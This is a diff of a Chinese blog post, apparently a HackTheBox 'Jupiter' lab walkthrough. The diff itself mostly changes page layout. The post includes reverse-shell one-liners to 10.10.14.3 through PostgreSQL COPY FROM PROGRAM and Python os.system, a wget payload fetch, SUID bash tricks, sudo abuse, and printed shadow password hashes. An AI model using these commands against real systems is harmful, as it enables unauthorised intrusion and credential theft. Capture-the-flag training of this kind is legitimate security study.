@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Jupiter 10.10.11.216                                                                                                              端口扫描22和80: 123456789101112131">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Jupiter 10.10.11.216   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.216Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-05 15:20 CSTNmap s">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Jupiter - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/06/05/Jupiter-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Jupiter 10.10.11.216                                                                                                              端口扫描22和80: 123456789101112131">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Jupiter 10.10.11.216   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.216Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-05 15:20 CSTNmap s">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060501.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060502.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060503.jpg">
@@ -129,8 +129,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -152,7 +159,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -219,14 +226,7 @@
 <li><a href="https://app.hackthebox.com/machines/Jupiter" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Jupiter</a></li>
 <li>10.10.11.216</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060501.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060501.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.216</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-05 15:20 CST</span><br><span class="line">Nmap scan report for 10.10.11.216</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)</span><br><span class="line">|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://jupiter.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 42.00 seconds</span><br></pre></td></tr></table></figure>
 
@@ -236,44 +236,16 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.216 jupiter.htb</span><br></pre></td></tr></table></figure>
 
 <p>一个天文学相关的官网：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060502.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060502.jpg" alt=""></p>
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>子域名扫描发现kiosk:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://jupiter.htb/" -H 'Host: FUZZ.jupiter.htb' -fs 178</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 116ms]</span><br><span class="line">    * FUZZ: kiosk</span><br></pre></td></tr></table></figure>
 
 <h2 id="kiosk"><a href="#kiosk" class="headerlink" title="kiosk"></a>kiosk</h2><p>同样加hosts后访问,是一个grafana：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060503.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060503.jpg" alt=""></p>
 <h1 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h1><p>直接查看history，发现query请求里直接使用rawSql：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060504.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060504.jpg" alt=""></p>
 <p>直接修改sql语句，发现是postgresql：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060505.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060505.jpg" alt=""></p>
 <h2 id="postgresql-to-shell"><a href="#postgresql-to-shell" class="headerlink" title="postgresql to shell"></a>postgresql to shell</h2><p>postgresql可以直接执行操作系统命令：</p>
 <ul>
 <li>Command Execution with PostgreSQL Copy Command | by Nairuz Abulhul | R3d Buck3T | Medium<br><a href="https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767" target="_blank" rel="noopener">https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767</a></li>
@@ -281,146 +253,48 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1\"'</span><br></pre></td></tr></table></figure>
 
 <p> 打到postgres shell：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060506.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060506.jpg" alt=""></p>
 <p>然后直接写入公钥方便后续操作</p>
 <h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>运行pspy之类会发现/dev/shm/network-simulation.yml文件,并且我们有写入权限：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060507.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060508.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060507.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060508.jpg" alt=""></p>
 <p>那就可以修改其中内容来执行其他命令</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /dev/shm</span><br><span class="line">wget http://10.10.14.3:7777/network-simulation.yml -O network-simulation.yml</span><br></pre></td></tr></table></figure>
 
 <p>例如复制一个bash加suid：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060510.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060511.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060510.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060511.jpg" alt=""></p>
 <p>小坑，目标目录是/dev/shm的时候，复制和加suid都成功，执行无效，换成tmp目录就正常了，euid是juno，但还是读不了user,因为user.txt的权限设置</p>
 <p>但可以修改定时执行的sh文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/bash -p</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060512.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060513.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060512.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060513.jpg" alt=""></p>
 <p>然后juno用户也坑，应该是故意设置的，写公钥后也不能ssh</p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>所以只能在juno的reverse shell里读user.txt：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060514.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060514.jpg" alt=""></p>
 <h1 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h1><p>juno用户在science组，本地发现开放有8888端口，转发出来访问是一个jupyter，需要token：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh postgres@10.10.11.216 -L 8888:127.0.0.1:8888</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060515.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060515.jpg" alt=""></p>
 <p>直接在对应日志里得到最新的token：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -rie token /opt/solar-flares/logs | sort</span><br><span class="line"></span><br><span class="line">/opt/solar-flares/logs/jupyter-2023-06-05-09.log:     or http://127.0.0.1:8888/?token=0f57278de120afc999f9f46f889c33c58289cdc1b26a6cb9</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060516.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060516.jpg" alt=""></p>
 <h1 id="jovian"><a href="#jovian" class="headerlink" title="jovian"></a>jovian</h1><p>jupyter可以运行任意Python代码(用不同的端口避免前面juno那个sh文件里的干扰)：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os; os.system(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.3/4445 0&gt;&amp;1"'</span>);</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060517.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060517.jpg" alt=""></p>
 <p>得到的是jovian用户，写公钥方便后续操作</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060518.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060518.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>可以sudo运行sattrack文件，这个文件当前用户有写权限可以直接修改：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060519.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060519.jpg" alt=""></p>
 <h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p>文件权限设置错误导致的非预期，预期是strace发现sattrick从/tmp读取配置，并且有一个默认配置文件，复制过去，修改其中URL来写入本地文件:</p>
 <ul>
 <li>HackTheBox - Jupiter - YouTube<br><a href="https://www.youtube.com/watch?v=HOvVjVw3pww&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=HOvVjVw3pww&amp;ab_channel=IppSec</a></li>
 </ul>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>那就可以直接复制个bash：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060520.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023060520.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$IW34JPHywVa4Fs590kLAs1$L2hNBUYic4PnYnxpIGE7HXzv.DaeGC4eLE9KJOU6f77:19482:0:99999:7:::</span><br><span class="line">juno:$y$j9T$6lgwfUNA28oEIGEaZqFAE.$jpCxLf9xwuwFgO695XVQql6Ol8zLonhGWeMUb.&#x2F;7zFB:19482:0:99999:7:::</span><br><span class="line">jovian:$y$j9T$upCjEbA.hevRmruvd2qhK&#x2F;$l3vTld&#x2F;sG3XJO9&#x2F;aYPjGPsqNiqB3F50CXkheKDax0e6:19423:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
@@ -437,7 +311,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-10-23T03:09:14.452Z" itemprop="dateUpdated">2023-10-23 11:09:14</time>
+    Last updated: <time datetime="2023-10-23T03:09:14.452Z" itemprop="dateUpdated">2023-10-23 11:09:14</time>
 </span><br>
 
 
@@ -604,11 +478,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
